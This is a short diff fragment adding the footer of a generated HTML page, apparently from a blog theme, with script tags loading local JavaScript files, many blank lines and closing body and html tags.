+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
